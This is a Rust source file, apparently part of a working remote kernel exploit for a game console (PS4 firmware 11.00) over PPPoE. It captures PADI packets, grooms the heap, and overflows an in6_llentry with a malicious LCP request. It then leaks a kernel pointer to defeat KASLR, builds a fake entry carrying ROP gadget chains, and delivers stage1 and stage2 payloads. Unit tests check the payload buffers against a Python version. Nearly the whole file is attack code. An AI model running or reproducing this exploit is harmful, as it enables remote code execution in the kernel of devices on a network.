use super::negotiations::{ipcp_negotiation, lcp_negotiation, ppp_negotiation};
use super::offsets::OFFSETS_FW_1100;
use super::packet::{
    create_icmpv6_echo_req, create_ipv4_packet, create_lcp_conf_request, create_lcp_term_req,
    create_padt_packet, create_udp_header,
};
use super::packet::{
    is_icmpv6_nd_ns, is_icmpv6_router_sol, is_lcp_conf_reject, is_lcp_conf_req, is_padi_packet,
};
use super::utils::build_overflow_lle;
use super::utils::extract_pppoe_softc_list;
use super::utils::pin_to_cpu_0;
use super::utils::search_for_corrupted_obj;
use super::utils::{build_first_rop, build_second_rop};
use super::utils::{create_ethernet_channel, fragment, listen_for_packet, spray};
use crate::constants;
use pnet::datalink::NetworkInterface;
use std::process;
use std::thread;
use std::time;

pub struct Exploit {
    pub exploit_state: ExploitState,
    pub stage1: Vec<u8>,
    pub stage2: Vec<u8>,
}

impl Exploit {
    pub fn capture_first_padi(&mut self, interface: &NetworkInterface) {
        let (mut _tx, mut rx) = create_ethernet_channel(interface).unwrap();
        println!("[+] Waiting for first PADI");
        let first_ignore_padi = listen_for_packet(rx.as_mut(), is_padi_packet);
        handle_padi(&mut self.exploit_state, &first_ignore_padi.unwrap());
    }

    pub fn ppp_negotiation(&mut self, interface: &NetworkInterface, ac_cookie: Option<Vec<u8>>) {
        ppp_negotiation(interface, &mut self.exploit_state, ac_cookie);
    }

    pub fn lcp_negotiation(&mut self, interface: &NetworkInterface) {
        lcp_negotiation(interface, &mut self.exploit_state);
    }

    pub fn ipcp_negotiation(&mut self, interface: &NetworkInterface) {
        ipcp_negotiation(interface, &mut self.exploit_state);
    }

    pub fn heap_grooming(&mut self, interface: &NetworkInterface) {
        // Open channel
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();

        let result = listen_for_packet(rx.as_mut(), is_icmpv6_router_sol);
        handle_icmpv6_router_sol(&mut self.exploit_state, result.unwrap().as_slice());

        println!("[+] Target IPv6 {:?}", self.exploit_state.target_ipv6);
        // Enters grooming loop
        spray(
            tx.as_mut(),
            rx.as_mut(),
            self.exploit_state.source_mac,
            self.exploit_state.target_mac,
            self.exploit_state.target_ipv6,
        );
        println!("\n[+] Heap grooming...done");
    }

    pub fn memory_corruption(&mut self, interface: &NetworkInterface) {
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();

        pin_to_cpu_0(
            tx.as_mut(),
            self.exploit_state.source_mac,
            self.exploit_state.target_mac,
        );
        thread::sleep(time::Duration::from_secs(1));

        // Corrupt in6_llentry object
        let overflow_lle = build_overflow_lle(self.exploit_state.pppoe_softc);
        println!("[+] Sending malicious LCP configure request...");
        let mal_request = create_lcp_conf_request(
            self.exploit_state.source_mac,
            self.exploit_state.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            Some(overflow_lle),
        );
        let _result = tx
            .send_to(&mal_request, None)
            .expect("[-] Failed to send IPCP configure req packet");
        println!("[+] Waiting for LCP configure reject...");
        listen_for_packet(rx.as_mut(), is_lcp_conf_reject);
        // Re-negotiate after rejection
        self.lcp_negotiation(interface);
        self.ipcp_negotiation(interface);

        // Now search for the corrupted object
        let corrupted_source_ipv6: Option<[u8; 16]> = search_for_corrupted_obj(
            tx.as_mut(),
            rx.as_mut(),
            self.exploit_state.source_mac,
            self.exploit_state.target_mac,
            self.exploit_state.target_ipv6,
        );

        match corrupted_source_ipv6 {
            Some(source_ipv6) => {
                println!(
                    "\n[+] Scanning for corrupted object...\nFound -> {:x?}",
                    source_ipv6
                );
                self.exploit_state.source_ipv6 = source_ipv6;
            }
            None => {
                println!("[-] Scanning for corrupted object...failed. Please retry the exploit.");
                process::exit(1);
            }
        }
    }

    pub fn defeat_kaslr(&mut self, interface: &NetworkInterface) {
        let (mut _tx, mut rx) = create_ethernet_channel(interface).unwrap();
        // Declare packet outside the loop
        let mut packet = Vec::new();
        // Keep listening until we get a packet with the desired length
        loop {
            packet = listen_for_packet(rx.as_mut(), is_icmpv6_nd_ns).unwrap();
            if packet.len() >= 89 {
                //TODO change
                break;
            }
        }
        // Extract the ICMPv6 payload and parse the relevant field
        if let Some(pppoe_softc_list) = extract_pppoe_softc_list(&packet) {
            println!("[+] pppoe_softc_list: {:#x}", pppoe_softc_list);

            // Calculate the KASLR offset
            let kaslr_offset = pppoe_softc_list.wrapping_sub(OFFSETS_FW_1100.pppoe_softc_list);
            println!("[+] kaslr_offset: {:#x}", kaslr_offset);
            self.exploit_state.kaslr_offset = kaslr_offset;

            // Validate the leak based on address comparison
            if (pppoe_softc_list & 0xffffffff00000fff)
                != (OFFSETS_FW_1100.pppoe_softc_list & 0xffffffff00000fff)
            {
                println!("[-] Error leak is invalid. Wrong firmware?");
                process::exit(1);
            }
        } else {
            println!("[-] Failed to extract pppoe_softc_list");
            process::exit(1);
        }
    }

    pub fn remote_code_exec(&mut self, interface: &NetworkInterface) {
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();
        let lcp_term = create_lcp_term_req(
            self.exploit_state.source_mac,
            self.exploit_state.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            0,
        );
        let _result = tx
            .send_to(lcp_term.as_slice(), None)
            .expect("[-] Failed to send lcp term request");
        let fake_lle = build_fake_lle(&mut self.exploit_state, &self.stage1);
        self.ppp_negotiation(interface, Some(fake_lle));
        let icmpv6_echo_req = create_icmpv6_echo_req(
            self.exploit_state.source_mac,
            self.exploit_state.target_mac,
            constants::SOURCE_IPV6,
            self.exploit_state.target_ipv6,
        );
        let _result = tx
            .send_to(icmpv6_echo_req.as_slice(), None)
            .expect("[-] Failed to icmpv6_echo_req request");
        println!("[+] Waiting for stage1 to resume...");
        let mut i = 0; // Wait for 3 lcp conf req
        while i < 3 {
            let _packet = listen_for_packet(rx.as_mut(), is_lcp_conf_req);
            i += 1;
        }
        // Send PADT
        let padt = create_padt_packet(
            self.exploit_state.source_mac,
            self.exploit_state.target_mac,
            constants::PPPOE_SESSION_ID.to_le_bytes(),
        );
        println!("[+] Sending PADT...");
        let _result = tx
            .send_to(padt.as_slice(), None)
            .expect("[-] Failed to send padt");
    }

    pub fn frag_and_send(&mut self, interface: &NetworkInterface) {
        let (mut tx, mut _rx) = create_ethernet_channel(interface).unwrap();
        let total_length: usize = self.stage2.len();
        let udp_header = create_udp_header(
            [0x00, 0x35], //TODO hardodce
            [0x23, 0x3c], // TODO
            total_length + 8,
        );
        let mut tobefrag = Vec::new();
        tobefrag.extend_from_slice(&udp_header);
        tobefrag.extend_from_slice(&self.stage2);

        let frags = fragment(tobefrag);
        for (i, frag) in frags.iter().enumerate() {
            let foff: usize = 128 * i;
            let is_last = i == frags.len() - 1;
            let current_udp_packet = create_ipv4_packet(
                constants::SOURCE_IPV4,
                constants::TARGET_IPV4,
                is_last, // true for the last fragment only
                frag.to_vec(),
                foff,
            );
            let mut ethernet_packet = Vec::new();
            //current_udp_packets
            ethernet_packet.extend(self.exploit_state.target_mac);
            ethernet_packet.extend(self.exploit_state.source_mac);
            ethernet_packet.extend(current_udp_packet);

            let _result = tx
                .send_to(ethernet_packet.as_slice(), None)
                .expect("[-] Failed to send etherpacket");
        }
    }
}

#[derive(Debug)]
pub struct ExploitState {
    pub source_mac: [u8; 6],
    pub target_mac: [u8; 6],
    pub pppoe_softc: u64,
    pub host_uniq: [u8; 8],
    pub target_ipv6: [u8; 16],
    pub source_ipv6: [u8; 16],
    pub kaslr_offset: u64,
}

impl Default for ExploitState {
    fn default() -> Self {
        ExploitState {
            source_mac: [0; 6],
            target_mac: [0; 6],
            pppoe_softc: 0,
            host_uniq: [0; 8],
            target_ipv6: [0; 16],
            source_ipv6: [0; 16],
            kaslr_offset: 0,
        }
    }
}

pub fn handle_padi(exploit_state: &mut ExploitState, data: &[u8]) {
    // Extracting Host Unique Tag and populating the self.pppoe_softc
    exploit_state.host_uniq = extract_host_uniq(data).unwrap();
    exploit_state.pppoe_softc = u64::from_le_bytes(exploit_state.host_uniq);
    println!("[+] pppoe_softc: 0x{:x}", exploit_state.pppoe_softc);
    // Extract and update source mac
    exploit_state.target_mac = extract_ps4_mac(data).unwrap();
}

pub fn handle_icmpv6_router_sol(exploit_state: &mut ExploitState, data: &[u8]) {
    println!("[+] Waiting for Router Solicitation packet");
    exploit_state.target_ipv6 = data[22..38].try_into().unwrap();
}

fn extract_host_uniq(data: &[u8]) -> Result<[u8; 8], Box<dyn std::error::Error>> {
    let mut result = [0u8; 8];
    // Go to the tags
    let mut offset = constants::ETH_HEADER_LEN + constants::PPPOE_HEADER_LEN;
    // Read all the tags until possible
    while offset + constants::PPPOE_TAG_HEADER_LEN <= data.len() {
        // Read Header
        let tag_type = u16::from_be_bytes([data[offset], data[offset + 1]]);
        let tag_len = u16::from_be_bytes([data[offset + 2], data[offset + 3]]) as usize;
        offset += constants::PPPOE_TAG_HEADER_LEN;
        if tag_type == constants::PPPOE_TAG_HOST_UNIQ && offset + tag_len <= data.len() {
            // Extract the Host-Uniq tag value
            let host_uniq = &data[offset..offset + tag_len];
            if tag_len == 8 {
                // If Host-Uniq is expected to be a 64-bit integer, interpret it as Big-Endian
                result.copy_from_slice(host_uniq);
                // println!("[+] Extracted Host-Uniq: {:?}", result);
                break;
            }
        }
        // Go to next tag
        offset += tag_len;
    }
    Ok(result)
}

fn extract_ps4_mac(data: &[u8]) -> Result<[u8; 6], Box<dyn std::error::Error>> {
    // Extract the source MAC address
    let offset = constants::ETH_SOURCE_MAC;
    let mac_bytes = &data[offset..offset + 6];
    // Create a 6-byte array and copy the data into it
    let mut mac_address = [0u8; 6];
    mac_address.copy_from_slice(mac_bytes);
    Ok(mac_address)
}

pub fn build_fake_ifnet(exploit_state: &mut ExploitState) -> Vec<u8> {
    let planted = (exploit_state.pppoe_softc + 0x07) & 0xffffffffffff; // Add 7 and truncate to 48
    let planted_bytes = planted.to_be_bytes();
    let truncated_bytes: [u8; 6] = planted_bytes[2..8]
        .try_into()
        .expect("slice with incorrect length");
    exploit_state.source_mac = truncated_bytes;
    exploit_state.source_mac.reverse(); //TODO make this agnostic

    print_current_state(exploit_state);
    // Fake ifnet
    let mut fake_ifnet = vec![0x41; 0x48]; // Fill with 'A' initially
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // if_addrhead
    fake_ifnet.resize(0x70, 0x41); // Fill to 0x70 with 'A'
    fake_ifnet.extend(&0x0001u16.to_le_bytes()); // if_index
    fake_ifnet.resize(0xa0, 0x41); // Fill to 0xa0 with 'A'
    fake_ifnet.push(constants::IFT_ETHER); // ifi_type
    fake_ifnet.push(0); // ifi_physical
    fake_ifnet.push(0x8 + 0x1); // ifi_addrlen
    fake_ifnet.resize(0x1b8, 0x41); // Fill to 0x1b8 with 'A'

    fake_ifnet.extend(&(exploit_state.pppoe_softc + constants::PPPOE_SOFTC_SC_DEST).to_le_bytes()); // if_addr
    fake_ifnet.resize(0x428, 0x41); // Fill to 0x428 with 'A'
    fake_ifnet.extend(&(exploit_state.pppoe_softc + 0x10 - 0x8).to_le_bytes()); // nd_ifinfo
                                                                                // if_afdata_lock

    fake_ifnet.resize(0x480, 0x41); // Fill to 0x480 with 'A'
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::RW_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock
                                                              // if_addr_mtx

    fake_ifnet.resize(0x4c0, 0x41); // Fill to 0x4c0 with 'A'

    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::MTX_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::MTX_UNOWNED.to_le_bytes()); // mtx_lock
    fake_ifnet
}

pub fn build_fake_lle(exploit_state: &mut ExploitState, stage1: &Vec<u8>) -> Vec<u8> {
    let planted = (exploit_state.kaslr_offset + OFFSETS_FW_1100.first_gadget) & 0xffffffffffff;
    exploit_state.source_mac = planted.to_le_bytes()[..6].try_into().unwrap();
    // Format source MAC in colon-separated hex format
    print_current_state(exploit_state);

    // Fake in6_llentry
    let mut fake_lle = vec![0x00; 0x00]; // Initiaslize empty byte array
                                         // lle_next (Third gadget)
    let lle_next = (exploit_state.kaslr_offset
        + OFFSETS_FW_1100.pop_rbx_pop_r14_pop_rbp_jmp_qword_ptr_rsi_10)
        .to_le_bytes();
    fake_lle.extend(&lle_next);
    fake_lle.extend(&0u64.to_le_bytes()); // lle_prev (NULL)
                                          // lle_lock (Fourth gadget)
    let lle_lock =
        (exploit_state.kaslr_offset + OFFSETS_FW_1100.lea_rsp_rsi_20_repz_ret).to_le_bytes();
    fake_lle.extend(&lle_lock);
    let lo_flags = (constants::RW_INIT_FLAGS | constants::LO_DUPOK).to_le_bytes();
    fake_lle.extend(&lo_flags);
    fake_lle.extend(&0u32.to_le_bytes()); // lo_data
    let lo_witness =
        (exploit_state.kaslr_offset + OFFSETS_FW_1100.add_rsp_b0_pop_rbp_ret).to_le_bytes();
    fake_lle.extend(&lo_witness);
    fake_lle.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock
                                                            // lle_tbl
    let lle_tbl = (exploit_state.pppoe_softc + constants::PPPOE_SOFTC_SC_DEST
        - constants::LLTABLE_LLTFREE)
        .to_le_bytes();
    fake_lle.extend(&lle_tbl);
    fake_lle.extend(&0u64.to_le_bytes()); // lle_head (NULL)
    fake_lle.extend(&0u64.to_le_bytes()); // lle_free (NULL)
    fake_lle.extend(&0u64.to_le_bytes()); // la_hold (NULL)
    fake_lle.extend(&0u32.to_le_bytes()); // la_numheld
    fake_lle.extend(&0u32.to_le_bytes()); // pads
    fake_lle.extend(&0u64.to_le_bytes()); // la_expire
    let la_flags = (constants::LLE_STATIC | constants::LLE_EXCLUSIVE).to_le_bytes();
    fake_lle.extend(&la_flags);
    fake_lle.extend(&0u16.to_le_bytes()); // la_asked
    fake_lle.extend(&0u16.to_le_bytes()); // la_preempt
    fake_lle.extend(&0u16.to_le_bytes()); // ln_byhint
    let ln_state = constants::ND6_LLINFO_NOSTATE.to_le_bytes();
    fake_lle.extend(&ln_state);
    fake_lle.extend(&0u16.to_le_bytes()); // ln_router
    fake_lle.extend(&0u32.to_le_bytes()); // pad
    fake_lle.extend(&0x7fffffffffffffffu64.to_le_bytes()); // ln_ntick
    fake_lle.extend(&0u32.to_le_bytes()); // lle_refcnt
    fake_lle.extend(&0u32.to_le_bytes()); // pad
                                          // ll_addr (big-endian)
    let ll_addr = 0x414141414141u64.to_be_bytes();
    fake_lle.extend(&ll_addr);
    // lle_timer
    fake_lle.extend(&0u64.to_le_bytes()); // sle
    fake_lle.extend(&0u64.to_le_bytes()); // tqe
    fake_lle.extend(&0u32.to_le_bytes()); // c_time
    fake_lle.extend(&0u32.to_le_bytes()); // pad
    fake_lle.extend(&0u64.to_le_bytes()); // c_arg (NULL)
    fake_lle.extend(&0u64.to_le_bytes()); // c_func (NULL)
    fake_lle.extend(&0u64.to_le_bytes()); // c_lock (NULL)
    let c_flags = constants::CALLOUT_RETURNUNLOCKED.to_le_bytes();
    fake_lle.extend(&c_flags);
    fake_lle.extend(&0u32.to_le_bytes()); // c_cpu
                                          // l3_addr6
    let sin6_len = constants::SOCKADDR_IN6_SIZE.to_le_bytes();
    fake_lle.extend(&sin6_len);
    let sin6_family = constants::AF_INET6.to_le_bytes();
    fake_lle.extend(&sin6_family);
    fake_lle.extend(&0u16.to_le_bytes()); // sin6_port
    fake_lle.extend(&0u32.to_le_bytes()); // sin6_flowinfo
    let sin6_addr = 0xfe80000100000000u64.to_be_bytes();
    fake_lle.extend(&sin6_addr);
    let sin6_addr_2 = 0x4141414141414141u64.to_be_bytes();
    fake_lle.extend(&sin6_addr_2);
    fake_lle.extend(&0u32.to_le_bytes()); // sin6_scope_id

    // Pad
    fake_lle.extend(&0u32.to_le_bytes());

    // Second gadget
    let second_gadget = exploit_state.kaslr_offset + OFFSETS_FW_1100.push_rbp_jmp_qword_ptr_rsi;
    let start: usize = OFFSETS_FW_1100.second_gadget_off.try_into().unwrap();
    let end: usize = (OFFSETS_FW_1100.second_gadget_off + 8).try_into().unwrap();
    fake_lle[start..end].copy_from_slice(&second_gadget.to_le_bytes());

    // Second ROP chain
    let rop2 = build_second_rop(exploit_state.kaslr_offset, stage1.len());
    // First ROP chain
    let rop = build_first_rop(stage1.len(), &fake_lle, &rop2, exploit_state.kaslr_offset);

    // Return the combined fake lle and ROP chains
    [fake_lle, rop, rop2, stage1.clone()].concat()
}

pub fn print_current_state(exploit_state: &ExploitState) {
    // Format MAC addresses
    println!("- Start Current State-----------------------------------------");
    let target_mac_str = exploit_state
        .target_mac
        .iter()
        .map(|byte| format!("{:02x}", byte))
        .collect::<Vec<String>>()
        .join(":");
    println!("[+] Target MAC: {}", target_mac_str);
    let source_mac_str = exploit_state
        .source_mac
        .iter()
        .map(|byte| format!("{:02x}", byte))
        .collect::<Vec<String>>()
        .join(":");
    println!("[+] Source MAC: {}", source_mac_str);
    // Format IPv6 addresses
    let target_ipv6_str = exploit_state
        .target_ipv6
        .chunks(2)
        .map(|chunk| format!("{:02x}{:02x}", chunk[0], chunk[1]))
        .collect::<Vec<String>>()
        .join(":");
    println!("[+] Target IPv6: {}", target_ipv6_str);
    let source_ipv6_str = exploit_state
        .source_ipv6
        .chunks(2)
        .map(|chunk| format!("{:02x}{:02x}", chunk[0], chunk[1]))
        .collect::<Vec<String>>()
        .join(":");
    println!("[+] Source IPv6: {}", source_ipv6_str);
    // Print the PPPoE softc and KASLR offset
    println!("[+] PPPoE softc: {:#x}", exploit_state.pppoe_softc);
    println!("[+] KASLR Offset: {:#x}", exploit_state.kaslr_offset);
    println!("- End Current State------------------------------------------");
}

#[cfg(test)]
mod tests {
    use super::*;
    use pcap::Capture;
    use std::fs::File;
    use std::io::Read;
    use std::io::Write;
    use std::io::{self};

    fn read_stage(file_path: &str) -> io::Result<Vec<u8>> {
        let mut file = File::open(file_path)?;
        let mut buffer = Vec::new();
        file.read_to_end(&mut buffer)?;
        Ok(buffer) // Return the buffer
    }

    #[test]
    fn test_extract_host_uniq() {
        // Open the pcap file
        let mut cap = Capture::from_file("test_data/initial_two_padi.pcap")
            .expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_host_uniq(&packet) {
                    Ok(host_uniq) => {
                        println!("Extracted Host-Uniq: {:?}", host_uniq);
                        println!("Extracted Host-Uniq: {:?}", u64::from_be_bytes(host_uniq));
                        // Print the value as hexadecimal
                        println!(
                            "Converted value in hex: 0x{:016x}",
                            u64::from_be_bytes(host_uniq)
                        );

                        // Assert that the Host-Uniq value has the expected length
                        assert_eq!(host_uniq.len(), 8);
                        assert_eq!(u64::from_be_bytes(host_uniq), 0x002cf606ba9bffff)
                    }
                    Err(e) => {
                        panic!("Failed to extract Host-Uniq: {:?}", e);
                    }
                }
            }
        }
    }

    #[test]
    fn test_extract_source_mac() {
        // Open the pcap file
        let mut cap = Capture::from_file("test_data/initial_two_padi.pcap")
            .expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_ps4_mac(&packet) {
                    Ok(source_mac) => {
                        println!("Extracted Source MAC Address: {:?}", source_mac);
                        // Assert that the MAC address has the expected length
                        assert_eq!(source_mac.len(), 6);
                        // Optionally, check the MAC address values
                        assert_eq!(&source_mac, &[0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]);
                    }
                    Err(e) => {
                        panic!("Failed to extract Source MAC Address: {:?}", e);
                    }
                }
            }
        }
    }

    #[test]
    fn test_fake_ifnet_comparison() {
        let mut expl_state = ExploitState::default();

        // Fill with test data
        expl_state.pppoe_softc = 0x123456789ABCDEF0;
        let rust_fake_ifnet = build_fake_ifnet(&mut expl_state);

        // Dump the fake ifnet to a file
        let mut rust_file =
            File::create("test_data/rust_fake_ifnet.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_fake_ifnet)
            .expect("Failed to write to file");

        // Load the fake ifnet generated by Python
        let mut python_fake_ifnet = Vec::new();
        let mut python_file =
            File::open("test_data/fake_ifnet.bin").expect("Failed to open Python fake ifnet file");
        python_file
            .read_to_end(&mut python_fake_ifnet)
            .expect("Failed to read Python fake ifnet file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_fake_ifnet.len(),
            python_fake_ifnet.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in rust_fake_ifnet
            .iter()
            .zip(python_fake_ifnet.iter())
            .enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_overflow_lle_comparison() {
        // Generate malicious LLE using the Rust implementation
        let pppoe_softc: u64 = 0xffffea374898a600; // Initial pppoe
        let rust_overflow_lle = build_overflow_lle(pppoe_softc);

        // Dump the malicious LLE to a file
        let mut rust_file =
            File::create("test_data/rust_overflow_lle.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_overflow_lle)
            .expect("Failed to write to file");

        // Load the malicious LLE generated by Python
        let mut python_overflow_lle = Vec::new();
        let mut python_file =
            File::open("test_data/overflow_lle.bin").expect("Failed to open Python LLE file");
        python_file
            .read_to_end(&mut python_overflow_lle)
            .expect("Failed to read Python LLE file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_overflow_lle.len(),
            python_overflow_lle.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in rust_overflow_lle
            .iter()
            .zip(python_overflow_lle.iter())
            .enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_fake_lle_comparison() {
        let mut expl_state = ExploitState::default();

        // Fill with test data
        expl_state.kaslr_offset = 0x1eca4000;
        let stage1 = read_stage("stage1/stage1.bin").unwrap();
        expl_state.pppoe_softc = 0xffff9bba06f62c00;

        let rust_fake_lle = build_fake_lle(&mut expl_state, &stage1);

        // Dump the malicious LLE to a file
        let mut rust_file =
            File::create("test_data/rust_fake_lle.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_fake_lle)
            .expect("Failed to write to file");

        // Load the malicious LLE generated by Python
        let mut python_fake_lle = Vec::new();
        let mut python_file =
            File::open("test_data/fake_lle.bin").expect("Failed to open Python LLE file");
        python_file
            .read_to_end(&mut python_fake_lle)
            .expect("Failed to read Python LLE file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_fake_lle.len(),
            python_fake_lle.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in
            rust_fake_lle.iter().zip(python_fake_lle.iter()).enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_read_stage() {
        let stage2: Vec<u8> = read_stage("stage2/stage2.bin").unwrap();
        assert_eq!(stage2.len(), 2705);
    }

    #[test]
    fn test_fragment() {
        let stage2: Vec<u8> = read_stage("stage2/stage2.bin").unwrap();
        let frags = fragment(stage2);
        assert_eq!(frags.len(), 3);
    }
}
